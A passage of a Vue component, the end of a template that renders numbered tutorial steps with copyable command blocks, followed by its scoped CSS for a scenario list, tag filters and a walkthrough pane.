      </header>

      <ol class="steps">
        <li v-for="(step, i) in selected.steps" :key="i" class="step">
          <div class="step-num">{{ String(i + 1).padStart(2, "0") }}</div>
          <div class="step-body">
            <p class="step-what">{{ step.what }}</p>
            <div v-if="step.cmd" class="step-code">
              <pre>{{ step.cmd }}</pre>
              <button class="step-copy" @click="copyCmd(step.cmd)" aria-label="Copy command">copy</button>
            </div>
            <pre v-if="step.out" class="step-out">{{ step.out }}</pre>
          </div>
        </li>
      </ol>
    </div>
  </div>
</template>

<style scoped>
.tutorial-grid {
  display: grid;
  grid-template-columns: 320px 1fr;
  gap: 16px;
  align-items: start;
}
@media (max-width: 860px) {
  .tutorial-grid { grid-template-columns: 1fr; }
}

.scenario-rail {
  background: rgba(11, 13, 18, 0.5);
  backdrop-filter: blur(14px) saturate(160%);
  -webkit-backdrop-filter: blur(14px) saturate(160%);
  border: 1px solid rgba(255, 255, 255, 0.06);
  border-radius: 12px;
  padding: 14px;
  position: sticky;
  top: 76px;
}
@media (max-width: 860px) {
  .scenario-rail { position: static; }
}

.filter-block {
  margin-bottom: 12px;
  padding-bottom: 12px;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

.search-wrap {
  position: relative;
  margin-bottom: 10px;
}
.search-input {
  width: 100%;
  background: rgba(7, 9, 13, 0.7);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 6px;
  padding: 8px 12px 8px 30px;
  color: var(--color-text);
  font-family: var(--font-mono);
  font-size: 12px;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.search-input:focus {
  outline: none;
  border-color: rgba(94, 227, 255, 0.4);
  box-shadow: 0 0 0 3px rgba(94, 227, 255, 0.1);
}
.search-input::placeholder { color: var(--color-dim); }
.search-input::-webkit-search-cancel-button { display: none; }
.search-icon {
  position: absolute;
  left: 10px;
  top: 50%;
  transform: translateY(-50%);
  color: var(--color-dim);
  font-size: 14px;
  pointer-events: none;
}

.tag-row {
  display: flex;
  flex-wrap: wrap;
  gap: 5px;
}
.tag-chip {
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid rgba(255, 255, 255, 0.08);
  color: var(--color-dim);
  font-family: var(--font-mono);
  font-size: 10.5px;
  letter-spacing: 0.04em;
  padding: 3px 8px;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.18s var(--ease-glass);
}
.tag-chip:hover {
  background: rgba(255, 255, 255, 0.06);
  color: var(--color-text);
}
.tag-chip.accent-see.active {
  background: rgba(94, 227, 255, 0.15);
  border-color: rgba(94, 227, 255, 0.5);
  color: var(--color-see);
}
.tag-chip.accent-control.active {
  background: rgba(242, 180, 65, 0.15);
  border-color: rgba(242, 180, 65, 0.5);
  color: var(--color-control);
}
.tag-chip.accent-break.active {
  background: rgba(255, 107, 92, 0.15);
  border-color: rgba(255, 107, 92, 0.5);
  color: var(--color-break);
}

.filter-meta {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 10px;
  font-family: var(--font-mono);
  font-size: 11px;
  color: var(--color-dim);
}
.clear-btn {
  background: transparent;
  border: none;
  color: var(--color-dim);
  font-family: var(--font-mono);
  font-size: 11px;
  cursor: pointer;
  padding: 2px 4px;
  text-decoration: underline;
  text-decoration-color: rgba(255, 255, 255, 0.15);
}
.clear-btn:hover { color: var(--color-text); }

.rail-label {
  font-family: var(--font-mono);
  font-size: 10px;
  letter-spacing: 0.18em;
  text-transform: uppercase;
  color: var(--color-dim);
  padding: 4px 8px 10px;
}

.scenario-list {
  list-style: none;
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: column;
  gap: 4px;
}
@media (max-width: 860px) {
  .scenario-list {
    flex-direction: row;
    overflow-x: auto;
    padding-bottom: 4px;
  }
  .scenario-item { min-width: 240px; }
}

.scenario-item {
  display: flex;
  gap: 10px;
  align-items: flex-start;
  padding: 10px 10px;
  border-radius: 8px;
  cursor: pointer;
  border: 1px solid transparent;
  transition: all 0.2s var(--ease-glass);
}
.scenario-item:hover {
  background: rgba(255, 255, 255, 0.04);
}
.scenario-item.active {
  background: rgba(255, 255, 255, 0.06);
  border-color: rgba(255, 255, 255, 0.1);
}
.scenario-item.accent-see.active { border-left: 2px solid var(--color-see); }
.scenario-item.accent-control.active { border-left: 2px solid var(--color-control); }
.scenario-item.accent-break.active { border-left: 2px solid var(--color-break); }

.scenario-icon {
  font-size: 18px;
  line-height: 1.3;
}
.scenario-text {
  display: flex;
  flex-direction: column;
  gap: 2px;
  flex: 1;
  min-width: 0;
}
.scenario-title {
  font-size: 13px;
  color: var(--color-text);
  line-height: 1.35;
  font-weight: 500;
}
.scenario-item.active .scenario-title { color: var(--color-text); }
.scenario-meta {
  font-family: var(--font-mono);
  font-size: 10px;
  color: var(--color-dim);
  letter-spacing: 0.08em;
  text-transform: uppercase;
}

.empty {
  padding: 18px 14px;
  font-size: 13px;
  color: var(--color-dim);
  text-align: center;
}

.walkthrough-pane {
  background: linear-gradient(180deg, rgba(28, 33, 42, 0.55) 0%, rgba(20, 24, 30, 0.45) 100%);
  backdrop-filter: blur(22px) saturate(180%);
  -webkit-backdrop-filter: blur(22px) saturate(180%);
  border: 1px solid rgba(255, 255, 255, 0.06);
  border-radius: 14px;
  padding: 28px 30px;
  box-shadow:
    inset 0 1px 0 rgba(255, 255, 255, 0.07),
    0 24px 60px -20px rgba(0, 0, 0, 0.55);
}
.walkthrough-pane.accent-see { border-top: 2px solid rgba(94, 227, 255, 0.4); }
.walkthrough-pane.accent-control { border-top: 2px solid rgba(242, 180, 65, 0.4); }
.walkthrough-pane.accent-break { border-top: 2px solid rgba(255, 107, 92, 0.4); }

.walk-head { margin-bottom: 24px; }
.walk-eyebrow {
  font-family: var(--font-mono);
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.18em;
  text-transform: uppercase;
  color: var(--color-dim);
  margin-bottom: 8px;
}
.walkthrough-pane.accent-see .walk-eyebrow { color: var(--color-see); }
.walkthrough-pane.accent-control .walk-eyebrow { color: var(--color-control); }
.walkthrough-pane.accent-break .walk-eyebrow { color: var(--color-break); }

.walk-head h3 {
  font-size: 22px;
  font-weight: 600;
  letter-spacing: -0.015em;
  line-height: 1.2;
  margin-bottom: 8px;
}
.walk-summary {
  font-size: 14px;
  color: var(--color-dim);
  line-height: 1.5;
}

.walk-tags {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  margin-top: 12px;
}
.walk-tag {
  font-family: var(--font-mono);
  font-size: 10px;
  letter-spacing: 0.12em;
  text-transform: uppercase;
  padding: 2px 8px;
  border-radius: 3px;
  font-weight: 600;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid rgba(255, 255, 255, 0.08);
}
.walk-tag.accent-see {
  color: var(--color-see);
  border-color: rgba(94, 227, 255, 0.25);
}
.walk-tag.accent-control {
  color: var(--color-control);
  border-color: rgba(242, 180, 65, 0.25);
}
.walk-tag.accent-break {
  color: var(--color-break);
  border-color: rgba(255, 107, 92, 0.25);
}

.steps {
  list-style: none;
  padding: 0;
  margin: 0;
  display: flex;
  flex-direction: column;
  gap: 18px;
}
.step {
  display: grid;
  grid-template-columns: 36px 1fr;
  gap: 14px;
  position: relative;
}
.step:not(:last-child)::before {
  content: "";
  position: absolute;
  left: 17px;
  top: 32px;
  bottom: -18px;
  width: 1px;
  background: linear-gradient(180deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
}
.step-num {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: rgba(7, 9, 13, 0.7);
  border: 1px solid rgba(255, 255, 255, 0.1);
  display: flex;
  align-items: center;
  justify-content: center;
  font-family: var(--font-mono);
  font-size: 12px;
  font-weight: 600;
  color: var(--color-text);
  flex-shrink: 0;
  z-index: 1;
}
.step-body {
  padding-top: 6px;
  min-width: 0;
}
.step-what {
  font-size: 14px;
  color: var(--color-text);
  line-height: 1.55;
  margin-bottom: 8px;
}
.step-code {
  position: relative;
  background: rgba(7, 9, 13, 0.75);
  border: 1px solid rgba(255, 255, 255, 0.06);
  border-radius: 8px;
  padding: 12px 14px;
  margin-bottom: 8px;
}
.step-code pre {
  font-family: var(--font-mono);
  font-size: 12px;
  line-height: 1.55;
  color: var(--color-text);
  overflow-x: auto;
  margin: 0;
  white-space: pre;
}
.step-copy {
  position: absolute;
  top: 8px;
  right: 8px;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid rgba(255, 255, 255, 0.08);
  color: var(--color-dim);
  font-family: var(--font-mono);
  font-size: 10px;
  padding: 3px 8px;
  border-radius: 3px;
  cursor: pointer;
  transition: all 0.15s;
}
.step-copy:hover {
  color: var(--color-text);
  border-color: rgba(255, 255, 255, 0.2);
}
.step-copy:active {
  color: var(--color-see);
  border-color: var(--color-see);
}
.step-out {
  background: rgba(94, 227, 255, 0.04);
  border: 1px solid rgba(94, 227, 255, 0.1);
  border-radius: 6px;
  padding: 8px 12px;
  font-family: var(--font-mono);
  font-size: 11.5px;
  color: var(--color-dim);
  margin: 0;
  white-space: pre-wrap;
  line-height: 1.5;
}
</style>
